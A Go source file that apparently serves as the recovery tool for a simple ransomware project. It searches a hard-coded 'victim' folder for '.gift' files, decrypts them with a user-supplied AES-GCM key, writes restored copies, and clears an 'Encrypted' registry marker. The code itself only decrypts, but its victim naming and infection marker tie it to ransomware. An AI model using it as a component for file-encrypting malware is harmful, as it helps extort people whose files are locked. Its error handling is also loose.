package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

func main() {

	victimDirectory := "C:\\ftp\\"

	var files []string
	err := filepath.Walk(victimDirectory,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() && filepath.Ext(path) == ".gift" {
				files = append(files, path)
			}

			return nil
		})

	if err != nil {
		fmt.Println(err)
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
	fmt.Println("Please enter your key!")

	var input string
	fmt.Scanln(&input)
	key := []byte(input)

	if err != nil {
		fmt.Println(err)
	}

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()

	for _, file := range files {
		ciphertext, err := ioutil.ReadFile(file)
		if len(ciphertext) < nonceSize {
			fmt.Println(err)
		}
		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		fmt.Println(string(plaintext))
		f, err := os.Create((file + ".restored"))
		f.Write(plaintext)
		f.Close()
		if err != nil {
			println("f", err)
		}
	}

	if err != nil {
		fmt.Println(err)
	}
	k.SetStringValue("Encrypted", "0")
}
